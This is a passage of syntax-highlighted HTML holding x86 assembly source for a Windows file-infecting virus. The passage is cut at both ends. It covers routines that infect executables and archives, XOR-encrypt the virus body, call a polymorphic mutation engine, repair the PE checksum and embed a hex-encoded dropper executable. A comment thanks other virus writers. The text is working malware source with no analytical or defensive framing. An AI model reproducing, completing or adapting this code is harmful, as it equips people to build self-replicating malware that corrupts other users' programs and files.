    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">iENC_struc</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">iENC_encrypt</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GlobalAllocHandle3</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">OldBytes</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,((</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">crypt</span><span class="sc4">)/</span><span class="sc2">4</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">cloop</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">cloop</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc4">-</span><span class="sc5">LIMIT</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc5">LIMIT</span><span class="sc0">       
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mmxe</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc9">Align</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapAddress</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Checksum</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">58h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TruncFile</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GlobalAllocHandle3</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Free some memory</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GlobalFree</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">UnMapFile</span><span class="sc0">

</span><span class="sc5">NoInfect</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infections</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TruncFile</span><span class="sc0">

</span><span class="sc5">UnMapFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_UnmapViewOfFile</span><span class="sc0">

</span><span class="sc5">CloseMap</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0">

</span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0">

</span><span class="sc5">CantOpen</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_dwFileAttributes</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetFileAttributesA</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">eBlock9</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;|| Infect given file in EDI                                               ||</span><span class="sc0">
</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">

</span><span class="sc5">InfectEDI</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">iENC_decrypt</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">eBlockA</span><span class="sc4">-</span><span class="sc5">BlockA</span><span class="sc0">

</span><span class="sc5">BlockA</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetFileAttributesA</span><span class="sc0">
    </span><span class="sc5">cmp_</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_ExitInfection</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_dwFileAttributes</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenFile</span><span class="sc0">
    </span><span class="sc5">cmp_</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_ExitInfection</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetFileSize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">duhast</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">engel</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">duhast</span><span class="sc0">
</span><span class="sc5">engel</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewEIP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldEIP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ModBase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Infection</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ModBase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldEIP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewEIP</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                          </span><span class="sc1">; Overlapppppp</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">_ExitInfection</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">eBlockA</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">InfectArchiveEDI</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">iENC_decrypt</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">eBlockB</span><span class="sc4">-</span><span class="sc5">BlockB</span><span class="sc0">

</span><span class="sc5">BlockB</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">7Fh</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">eosz_edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">EXTENSION</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">InfectArchives</span><span class="sc0">

</span><span class="sc5">eBlockB</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;|| Infect Archives (using WFD Info)                                       ||</span><span class="sc0">
</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Infinite thanx here to two guys: StarZer0 and Int13h... Without you,</span><span class="sc0">
</span><span class="sc1">; i couldn't have been able to code this part of this virus :)</span><span class="sc0">

</span><span class="sc5">InfectArchives</span><span class="sc4">:</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">iENC_decrypt</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">eBlockC</span><span class="sc4">-</span><span class="sc5">BlockC</span><span class="sc0">

</span><span class="sc5">BlockC</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Save the name to infect for</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TMP_szFileName</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; later...</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">7Fh</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00001000h</span><span class="sc0">                       </span><span class="sc1">; Alloc memory for unpack the</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">                       </span><span class="sc1">; dropper</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GlobalAlloc</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ExitInfectArchive</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GlobalAllocHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">over_dropper</span><span class="sc0">
</span><span class="sc5">dr0p</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">003h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">007h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Ah</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">022h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0BAh</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">010h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">009h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">021h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">090h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">090h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06Fh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">057h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">033h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">032h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">024h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">037h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">088h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">04Ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">004h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0D8h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">026h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">09Dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">06Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">008h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E0h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">08Eh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">081h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00Bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">019h</span><span class="sc0">
